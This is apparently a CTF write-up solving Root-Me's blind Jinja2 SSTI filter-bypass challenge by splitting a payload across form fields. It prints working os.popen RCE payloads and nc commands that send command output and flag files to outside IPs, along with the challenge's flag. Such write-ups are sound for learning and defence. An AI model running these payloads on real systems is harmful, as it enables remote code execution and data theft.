+++
title = "Bypassing Filters in a Blind SSTI: A Root-Me Walkthrough"
description = "A detailed account of tackling a high-difficulty blind SSTI challenge, from code analysis and payload splitting to out-of-band data exfiltration."
date = "2025-09-11"
draft = false
tags = ['ssti', 'ctf', 'python', 'jinja2', 'root-me', 'walkthrough', 'blind-oob-ssti', 'oob']
+++

After leveling up my SSTI skills, I went looking for a tougher challenge and found it on Root-Me: [Python - Blind SSTI & filters bypass](https://www.root-me.org/en/Challenges/Web-Server/Python-Blind-SSTI-Filters-Bypass). This one was rated "High difficulty" for a reason. It was a blind vulnerability, meaning the server gives no feedback, and it had strict input restrictions. This is the story of how I broke it down, including all the dead ends and discoveries.

## << EXPLORE >>

### Phase 1: Fumbling in the Dark

The application had four input fields: `name`, `surname`, `email`, and `birthday`. My first instinct was to throw every payload I knew at it. I started cycling through the [PayloadBox SSTI list](https://github.com/payloadbox/ssti-payloads), testing each field individually.

```http
# Attempt 1
name={{7*7}}&surname=x&email=x@y.com&bday=01%2F01%2F1999&button=

# Attempt 2
name=x&surname={{7*7}}&email=x@y.com&bday=01%2F01%2F1999&button=

# ...and so on...
```

Of course, nothing happened. No errors, no output, nothing. It was a true blind vulnerability. I realized I needed a language-specific payload and a better way to test. I even briefly considered writing a custom Caido plugin to automate this, since I don't have Burp Suite Pro.

My next step was to assume a Jinja2 engine and try a blind execution payload, like a `sleep` command or an Out-of-Band (OOB) callback. I tried one of my shortest RCE payloads:

```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

This immediately triggered a validation error for every field: the payload was too long. I was completely stuck and called it a night.

### Phase 2: The "Aha!" Moment

The next day, I had a facepalm moment. (I'd love to say I spotted it myself, but I saw a hint in a forum that the source code was available). I had completely ignored the link in the site's footer.

> Our website's framework is now open source! You can download it **here**. | © Hackorp 2021

**Lesson learned: in a CTF, *nothing* is useless.**

### Phase 3: Code Analysis

Downloading and analyzing the source code was the breakthrough. It revealed the exact mechanics I was up against:

1.  **Engine Confirmed:** The application uses **Jinja2**.
2.  **Double Rendering:** The application renders the template *twice*. This is the critical vulnerability.
3.  **Payload Splitting:** The mail template concatenates the input fields before the second render: `'{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'`. This meant I could split my payload across the four fields!
4.  **Filters and Limits:**
    *   **Lengths:** `name` (20), `surname` (49), `email` (49), `bday` (10).
    *   **Blacklist:** `{{`, `}}`, `{%`, `%}`, `import`, `eval`, `builtins`, `class`, `[`, `]`.

The double rendering was the key. The first render would assemble the parts of my payload, bypassing the `{{` blacklist. The second render would then execute the assembled, malicious string.

### Phase 4: Local Proof of Concept

I built a local PoC script to test this theory.

**Test 1: Simple Math**
I ran my script with a simple split payload:
```bash
python pocs/rootme/ch73.py "name={&surname={7*7}&bday=}"
```

**First Render Output:** The script showed the payload being assembled perfectly.
```
Hello team,

A new hacker wants to join our private Bug bounty program! Mary, can you schedule an interview?

 - Name: {
 - Surname: {7*7}
 - Email: 
 - Birth date: }

I'm sending you the details of the application in the attached CSV file:

 - '{{7*7}}.csv'

Best regards,
```

**Second Render Output:** The expression is executed.
```
... I'm sending you the details of the application in the attached CSV file:

 - '49.csv'
...
```
Voila! The theory was sound.

**Test 2: Time-based Blind Test**
Next, a `sleep` command to confirm RCE:
```bash
python pocs/rootme/ch73.py "name={&surname={cycler.__init__.__globals__.os.popen&email=('sleep 5').read()}&bday=}"
```

The script paused for 5.02 seconds before completing. RCE confirmed.

### Phase 5: Out-of-Band (OOB) Data Exfiltration

Now I needed to see command output. The plan: pipe command output via `nc` (a networking utility for reading/writing to network connections) to a server I control.

My first thought was `ngrok`, but I hit a paywall.

```bash
$ ngrok tcp 12345
ERROR:  failed to start tunnel: You must add a credit or debit card before you can use TCP endpoints on a free account...
```

I switched to a free alternative: **Pinggy**. The setup was simple:
1.  **Local Listener:** `nc -lk 1234`
2.  **Expose with Pinggy:** `ssh -p 443 -R0:localhost:1234 tcp@free.pinggy.io`
3.  **Get Public URL:** Pinggy provided a URL: `tcp://wdbuk-49-42-141-200.a.free.pinggy.link:46651`.

This URL was too long for my payload. But a simple `ping` revealed the underlying IP:

```bash
$ ping wdbuk-49-42-141-200.a.free.pinggy.link
PING lin.ap.1.a.pinggy.click (139.162.21.36): 56 data bytes
```

The IP `139.162.21.36` was much shorter. I confirmed it worked:

```bash
# Terminal 1: Send data using the IP
$ echo '$sitasp$ using ping ip' | nc 139.162.21.36 46651

# Listening Terminal: Data is received
$sitasp$ using ping ip
```

Perfect. The OOB channel was ready.

## << EXPLOIT >>

### Phase 6: The Final Assault

I was now ready to exfiltrate data from the live server.

**1. Get User ID**
*   `name`: `{`
*   `surname`: `{cycler.__init__.__globals__.os.popen`
*   `email`: `('id | nc 139.162.21.36 46651').read()}`
*   `bday`: `}`

My listener sprang to life: `uid=1042(web-serveur-ch73) gid=1042(web-serveur-ch73) ...`

**2. The Struggle for the Flag**
This was the hardest part. My goal was to find and read the flag file, but every attempt failed due to the 49-character limit on the `email` field.

*   `('find -name 'flag*' | nc ...').read()}` - Failed: quotes were tricky and the payload was too long.
*   I switched to a more optimized payload using `lipsum` (which my BFS script found as another path to `os`), but still struggled with length.
*   `{lipsum.__globals__.os.popen("find / -name 'flag.*' | xargs cat | nc ...").read()}` - Still too long. `Field 'email' is too long.`

After many frustrating attempts, I finally crafted a payload that was *just* short enough:

*   `name`: `{`
*   `surname`: `{lipsum.__globals__.os.popen("find -name 'flag.`
*   `email`: `*' | xargs cat|nc 172.237.65.217 45841").read()}`
*   `bday`: `}`

Success! The flag appeared in my `nc` listener:

**`j1nj4_s3rv3r_S1de_T3mpl4te_1j3ct10ns_1n_pyth0n`**

## Final Thoughts

This challenge was a fantastic lesson in methodical debugging. It truly showed that understanding the *entire* system (including reading the source code) is paramount. The journey from being completely stuck to slowly building a local PoC, figuring out the OOB channel, and fighting the character limits was incredibly rewarding.